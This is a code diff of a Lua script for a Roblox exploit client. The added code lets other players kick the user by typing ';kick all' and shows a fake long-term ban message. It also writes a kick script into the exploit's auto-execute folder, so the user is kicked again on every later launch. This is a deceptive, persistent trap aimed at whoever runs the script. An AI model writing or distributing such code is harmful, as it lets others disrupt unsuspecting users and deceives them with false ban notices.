@@ -1,33 +1,59 @@
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
--- Listen to chat messages from the local player
+-- Your kick reason
+local kickMessage = 'You have been banned for 29999 weeks 5 days 100 seconds.'
+
+-- Path to autoexecute folder, adjust if needed
+local autoexecFolder = "AutoExec"
+
+local function createKickScriptFile()
+    -- The content you want to save
+    local scriptContent = [[
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+player:Kick("]] .. kickMessage .. [[")
+    ]]
+
+    -- Filename for the kick script inside autoexecute folder
+    local filename = autoexecFolder .. "/kickBanScript.txt"  -- or .lua if you prefer
+
+    -- Use exploit's writefile function to create the file
+    if writefile then
+        writefile(filename, scriptContent)
+    elseif writefile and isfile and isfolder and isfolder(autoexecFolder) then
+        writefile(filename, scriptContent)
+    else
+        -- If no writefile support, you can print a warning or skip
+        print("writefile function not available in this exploit.")
+    end
+end
+
+-- Function to kick local player AND create the file
+local function kickLocalPlayer()
+    createKickScriptFile()
+    player:Kick(kickMessage)
+end
+
+-- Listen to your own chat input (the local player)
 player.Chatted:Connect(function(msg)
     if msg == ";kick all" then
-        -- This is the sender, do NOT kick yourself
-        -- Instead, send a signal somehow to other Vape clients (if possible)
-        -- But in pure local code, you can't kick others from here
-        -- So just return here and do nothing on this client
         return
     end
 end)
 
--- Listen to all players' chats (using a global chat listener in your Vape script)
--- (Assuming your exploit can listen to all players chat locally)
-local function onPlayerChatted(otherPlayer, message)
+-- Listen to other players' chat for ";kick all"
+local function onOtherPlayerChatted(otherPlayer, message)
     if message == ";kick all" and otherPlayer ~= player then
-        -- Another Vape user typed ";kick all" — kick this local player
-        player:Kick("You have been banned for 29999 weeks 5 days 100 seconds.")
+        kickLocalPlayer()
     end
 end
 
--- Connect the chat for all players
-local Players = game:GetService("Players")
-
+-- Connect chat events for all players except local player
 for _, p in pairs(Players:GetPlayers()) do
     if p ~= player then
         p.Chatted:Connect(function(msg)
-            onPlayerChatted(p, msg)
+            onOtherPlayerChatted(p, msg)
         end)
     end
 end
@@ -35,7 +61,7 @@ end
 Players.PlayerAdded:Connect(function(p)
     if p ~= player then
         p.Chatted:Connect(function(msg)
-            onPlayerChatted(p, msg)
+            onOtherPlayerChatted(p, msg)
         end)
     end
 end)
